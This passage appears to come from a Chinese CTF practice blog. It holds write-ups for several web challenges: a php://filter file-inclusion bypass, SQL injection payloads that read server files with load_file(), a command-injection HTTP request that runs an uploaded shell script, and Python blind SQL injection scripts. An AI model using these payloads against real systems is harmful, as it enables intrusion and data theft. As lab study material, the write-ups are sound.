class="hljs-string">&quot;./Archive_room.php&quot;</span> style=<span class="hljs-string">&quot;background-color:#000000;height:70px;width:200px;color:black;left:44%;cursor:default;&quot;</span>&gt;Oh! You found <span class="hljs-keyword">me</span>&lt;/a&gt;<br></code></pre></td></tr></table></figure><p>点击跳转到</p><p><a href="http://99cd5773-2487-4bd3-a8f6-235d68b2550c.node5.buuoj.cn:81/Archive_room.php">http://99cd5773-2487-4bd3-a8f6-235d68b2550c.node5.buuoj.cn:81/Archive_room.php</a></p><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>点击按钮，根据提示感觉是重新跳到了另一个页面</p><p>bp抓包查看服务器回应<br>发现</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">   secr3t.php        </span><br><span class="hljs-comment">--&gt;</span><br></code></pre></td></tr></table></figure><p>故访问  ：<br><a href="http://99cd5773-2487-4bd3-a8f6-235d68b2550c.node5.buuoj.cn:81/secr3t.php">http://99cd5773-2487-4bd3-a8f6-235d68b2550c.node5.buuoj.cn:81/secr3t.php</a></p><p>得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html&gt;<br>    &lt;title&gt;secret&lt;/title&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;../&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;tp&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;input&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;data&quot;</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Oh no!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>); <br><span class="hljs-comment">//flag放在了flag.php里</span><br><span class="hljs-meta">?&gt;</span><br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p> 访问  :  <a href="http://99cd5773-2487-4bd3-a8f6-235d68b2550c.node5.buuoj.cn:81/flag.php">http://99cd5773-2487-4bd3-a8f6-235d68b2550c.node5.buuoj.cn:81/flag.php</a></p><p>查看源码没发现啥，根据页面提示，flag应该就在网页源码里</p><p>但是直接用include接上伪议会直接执行，用base64解码输就行</p><p>最后payload：  </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">99</span>cd5773-<span class="hljs-number">2487</span>-<span class="hljs-number">4</span>bd3-a8f6-<span class="hljs-number">235</span>d68b2550c.node5.buuoj.cn:<span class="hljs-number">81</span>/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><p>注意要在secr3t.php传，<br>解码得到网页源码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>FLAG<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;background-color:black;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        <br>        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;font-family:verdana;color:red;text-align:center;&quot;</span>&gt;</span>啊哈！你找到我了！可是你看不到我QAQ~~~<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        <br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;</span>&gt;</span><br>            <span class="hljs-meta">&lt;?php</span><br><span class="hljs-meta">                echo &quot;我就在这里&quot;;</span><br><span class="hljs-meta">                $flag = &#x27;flag&#123;b7f18145-c01d-49fb-bd88-e30b9be76423&#125;&#x27;;</span><br><span class="hljs-meta">                $secret = &#x27;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#x27;</span><br><span class="hljs-meta">            ?&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>note-23</title>
    <link href="/2025/04/10/note-23/"/>
    <url>/2025/04/10/note-23/</url>
    
    <content type="html"><![CDATA[<h1 id="ctfshow-web14"><a href="#ctfshow-web14" class="headerlink" title="ctfshow_web14"></a>ctfshow_web14</h1><p>一开始也试了传c，但是就试到2，然后以为是源码绕过的，看wp发现是sql注入。<br>再试到3就能自己发现这个页面了，，，，，，，，<br>&#x2F;here_1s_your_f1ag.php<br>按f12发现：  </p><blockquote><p>if(preg_match(‘&#x2F;information_schema.tables|information_schema.columns|linestring| |polygon&#x2F;is’, $_GET[‘query’])){<br>die(‘@A@’);  </p></blockquote><p>禁用了information_schema猜是无列名注入</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27;<span class="hljs-built_in">union</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">select</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">database</span>()<br><br><span class="hljs-number">1</span>&amp;&amp;<span class="hljs-built_in">sleep</span>(<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure><p>字符注入</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>&amp;&amp;<span class="hljs-keyword">order</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">by</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span><br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">database</span>()<br></code></pre></td></tr></table></figure><p>试出是字符注入</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-built_in">table_name</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>mysql.innodb_table_stats<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">database</span>()<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>@@<span class="hljs-keyword">version</span><br><br>//alert(<span class="hljs-string">&#x27;10.2.26-MariaDB-log&#x27;</span>)<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-built_in">table_name</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>mysql.innodb_table_stats<br>//alert(<span class="hljs-string">&#x27;gtid_slave_pos,content&#x27;</span>)<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(*)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>gtid_slave_pos<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>content<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>*<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>content<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>load_file<span class="hljs-comment">/**/</span><br></code></pre></td></tr></table></figure><p>试一下无列名注入</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-number">0</span><span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-selector-tag">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)<span class="hljs-comment">/**/</span><span class="hljs-selector-tag">from</span><span class="hljs-comment">/**/</span>(<span class="hljs-selector-tag">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">/**/</span><span class="hljs-selector-tag">from</span><span class="hljs-comment">/**/</span><span class="hljs-attribute">content</span>)<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-selector-tag">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-selector-tag">select</span><span class="hljs-comment">/**/</span>*<span class="hljs-comment">/**/</span><span class="hljs-selector-tag">from</span><span class="hljs-comment">/**/</span><span class="hljs-attribute">content</span>#<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-selector-tag">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)<span class="hljs-comment">/**/</span><span class="hljs-selector-tag">from</span><span class="hljs-comment">/**/</span><span class="hljs-attribute">content</span><br><br>//回显(<span class="hljs-number">123</span>,<span class="hljs-number">123</span>,<span class="hljs-number">123</span>,<span class="hljs-number">123</span>)无果<br></code></pre></td></tr></table></figure><p>看wp:<a href="https://blog.csdn.net/m0_55923820/article/details/118783171">https://blog.csdn.net/m0_55923820/article/details/118783171</a><br>原来sql还能加载文件<br>学到了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>load_file(<span class="hljs-string">&#x27;/var/www/html/secret.php&#x27;</span>)<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>load_file(<span class="hljs-string">&#x27;/tmp/gtf1y&#x27;</span>)<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>load_file(<span class="hljs-string">&#x27;/tmp/gtf1y/real_flag_is_here&#x27;</span>)<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>load_file(<span class="hljs-string">&#x27;/real_flag_is_here&#x27;</span>)<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>没想到是直接访问<span class="hljs-string">&#x27;/real_flag_is_here&#x27;</span><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>alert(<span class="hljs-string">&#x27;ctfshow&#123;dd04abdc-9d55-4d0d-8d2d-f616f7b82caa&#125;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>有无列明注入的版本wp，但我在我的环境没试出来：<br><a href="https://www.zxcms.com/content/3fcqbuf331l6p0.html">https://www.zxcms.com/content/3fcqbuf331l6p0.html</a></p><h1 id="ctfshow-红包题第二弹"><a href="#ctfshow-红包题第二弹" class="headerlink" title="ctfshow 红包题第二弹"></a>ctfshow 红包题第二弹</h1><p>这题有点牛逼了  </p><p><a href="https://www.cnblogs.com/wssw/p/18115718">https://www.cnblogs.com/wssw/p/18115718</a><br>前面的?&gt;意思是闭合前面的语句。<br>&lt;?&#x3D;是echo()的别名用法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable constant_">POST</span> /?cmd=?%3E%3C?=<span class="hljs-string">`.%20/??p/p?p??????`</span>; <span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">1.1</span><br><span class="hljs-title class_">Host</span>: 6fd1fc97-dca5-4a94-<span class="hljs-number">8065</span>-2622d4c7ed8d.<span class="hljs-property">challenge</span>.<span class="hljs-property">ctf</span>.<span class="hljs-property">show</span><br><span class="hljs-title class_">User</span>-<span class="hljs-title class_">Agent</span>: <span class="hljs-title class_">Mozilla</span>/<span class="hljs-number">5.0</span> (<span class="hljs-title class_">Windows</span> <span class="hljs-variable constant_">NT</span> <span class="hljs-number">10.0</span>; <span class="hljs-title class_">Win64</span>; x64; <span class="hljs-attr">rv</span>:<span class="hljs-number">124.0</span>) <span class="hljs-title class_">Gecko</span>/<span class="hljs-number">20100101</span> <span class="hljs-title class_">Firefox</span>/<span class="hljs-number">124.0</span><br><span class="hljs-title class_">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,*<span class="hljs-comment">/*;q=0.8</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="hljs-comment">Content-Type: multipart/form-data; boundary=---------------------------114514</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Connection: keep-alive</span><br><span class="hljs-comment">Cookie: UM_distinctid=1739f845e394-0cffbf96840b0c8-4c302d7c-144000-1739f845e3b4e2</span><br><span class="hljs-comment">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-comment">Cache-Control: max-age=0</span><br><span class="hljs-comment">Content-Length: 245</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">-----------------------------114514</span><br><span class="hljs-comment">Content-Disposition: form-data; name=&quot;fileUpload&quot;; filename=&quot;1.txt&quot;</span><br><span class="hljs-comment">Content-Type: text/plain</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">#! /bin/bash</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">cat /flag.txt</span><br><span class="hljs-comment">-----------------------------114514--</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>刷题note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>note-22</title>
    <link href="/2025/04/09/note-22/"/>
    <url>/2025/04/09/note-22/</url>
    
    <content type="html"><![CDATA[<h1 id="NewStarCTF-2023-公开赛道-midsql"><a href="#NewStarCTF-2023-公开赛道-midsql" class="headerlink" title="[NewStarCTF 2023 公开赛道]midsql"></a>[NewStarCTF 2023 公开赛道]midsql</h1><p>看了wp，只能说fuzz过程应该是最重要的，不然fuzz都fuzz不明白完全不知道下一步该干嘛<br>也许我记得一些注入方法，但是如果连注入点或者注入方式都fuzz不出来也是完全没用<br>看了wp后发现原理都懂，那为什么总是要看wp才能写出题目？<br>就是不会fuzz，<br>自己写的脚本：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>start=<span class="hljs-number">0</span><br>end=<span class="hljs-number">0</span><br>using=<span class="hljs-number">0</span><br>st = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$&amp;\()*&#x27; +,-./:;&quot;</span><br>flag =<span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&quot;http://9f146922-110f-45e5-a8b6-4b6fffbce466.node5.buuoj.cn:81/?id=&#x27;if(length(database())like(&#123;&#125;),sleep(3),1)&quot;</span><br><span class="hljs-comment"># for l in range (1,200):</span><br><span class="hljs-comment">#     url = &quot;http://758d4b32-13c8-42cc-9228-a7fe9aa9ffaf.node5.buuoj.cn:81/?id=if(length(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_name/**/like&#x27;items&#x27;)like/**/&#123;&#125;,sleep(3),1)&quot;.format(l)</span><br><span class="hljs-comment">#     start=time.time()</span><br><span class="hljs-comment">#     requests.get(url)</span><br><span class="hljs-comment">#     end=time.time()</span><br><span class="hljs-comment">#     using = end - start</span><br><span class="hljs-comment">#     if using &gt; 3:</span><br><span class="hljs-comment">#         print(&quot;tables length=&quot;,l,&quot;using time=&quot;,using)</span><br><span class="hljs-comment">#         time.sleep(5)</span><br><span class="hljs-comment">#         break</span><br><span class="hljs-comment">#     print(&quot;using time=&quot;,using)</span><br><span class="hljs-comment">#     time.sleep(0.05)</span><br><br><span class="hljs-comment"># for i in range(1,100):</span><br><span class="hljs-comment">#     for s in st :</span><br><span class="hljs-comment">#         url= &quot;http://758d4b32-13c8-42cc-9228-a7fe9aa9ffaf.node5.buuoj.cn:81/?id=if(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like&#x27;items&#x27;),&#123;&#125;,1)like(&#x27;&#123;&#125;&#x27;),sleep(3),1)&quot;.format(i,s)</span><br><span class="hljs-comment">#         start=time.time()</span><br><span class="hljs-comment">#         requests.get(url)</span><br><span class="hljs-comment">#         end=time.time()</span><br><span class="hljs-comment">#         using= end - start</span><br><span class="hljs-comment">#         if using &gt; 3:</span><br><span class="hljs-comment">#             flag=flag + s</span><br><span class="hljs-comment">#             print(&quot;tables name=&quot;,flag,&quot;using time=&quot;,using)</span><br><span class="hljs-comment">#             r=1</span><br><span class="hljs-comment">#             break</span><br><span class="hljs-comment">#         print(&quot;using time=&quot;,using,&quot;string:&quot;,s)</span><br><span class="hljs-comment">#         time.sleep(0.05)</span><br><span class="hljs-comment">#         print(flag)</span><br><span class="hljs-comment">#         r=0</span><br><span class="hljs-comment">#     if r == 0:</span><br><span class="hljs-comment">#         break</span><br><br><span class="hljs-comment">#id,name,price</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>):<br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">32</span>,<span class="hljs-number">177</span>) :<br>        url= <span class="hljs-string">&quot;http://758d4b32-13c8-42cc-9228-a7fe9aa9ffaf.node5.buuoj.cn:81/?id=if(ascii(substr((select/**/group_concat(name)/**/from/**/items),&#123;&#125;,1))like(&#x27;&#123;&#125;&#x27;),sleep(2),1)&quot;</span>.<span class="hljs-built_in">format</span>(i,s)<br>        start=time.time()<br>        requests.get(url)<br>        end=time.time()<br>        using= end - start<br>        <span class="hljs-keyword">if</span> using &gt; <span class="hljs-number">3</span>:<br>            flag=flag + <span class="hljs-built_in">chr</span>(s)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;tables name=&quot;</span>,flag,<span class="hljs-string">&quot;using time=&quot;</span>,using,<span class="hljs-string">&quot;number string:&quot;</span>,i)<br>            r=<span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;using time=&quot;</span>,using,<span class="hljs-string">&quot;string:&quot;</span>,<span class="hljs-built_in">chr</span>(s))<br>        time.sleep(<span class="hljs-number">0.1</span>)<br>        <span class="hljs-built_in">print</span>(flag)<br>        r=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">if</span> r == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>参考wp:  <a href="https://blog.csdn.net/Myon5/article/details/134096958">https://blog.csdn.net/Myon5/article/details/134096958</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>note-21</title>
    <link href="/2025/04/06/note-21/"/>
    <url>/2025/04/06/note-21/</url>
    
    <content type="html"><![CDATA[<h1 id="GYCTF2020-Ezsqli-1"><a href="#GYCTF2020-Ezsqli-1" class="headerlink" title="[GYCTF2020]Ezsqli 1"></a>[GYCTF2020]Ezsqli 1</h1><p>fuzz没fuzz懂，看别人wp是数字型注入<br>bp出or和and被过滤了，没回显，那就是盲注了<br>看别人wp是用 ^ 代替 or , &amp;&amp; 代替 and<br>测试是否有回显：</p><figure class="highlight m"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs m"><span class="hljs-number">1</span>&amp;&amp;length(database())&gt;<span class="hljs-number">0</span><br><span class="hljs-number">1</span>&amp;&amp;length(database())&lt;<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>然后测试substr和ascii是否被过滤：</p><figure class="highlight m"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs m"><span class="hljs-number">1</span>&amp;&amp;ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">0</span><br><span class="hljs-number">1</span>&amp;&amp;ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>写脚本求数据库长度和名字：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-built_in">str</span>=<span class="hljs-string">&#x27;_-&#125;&#123;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br>url = <span class="hljs-string">&#x27;http://c2a220ad-23f1-4a7a-82c0-73eeafd4d980.node5.buuoj.cn:81/index.php&#x27;</span><br><span class="hljs-comment"># 1&amp;&amp;ascii(substr(database(),1,1))=</span><br>database_name=<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    payload = <span class="hljs-string">&#x27;1&amp;&amp;length(database())=&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(l)<br>    data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: payload&#125;<br>    re = requests.post(url,data)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;testing 数据库长度:&quot;</span>,l)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Nu1L&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据库长度:&quot;</span>,l)<br>        <span 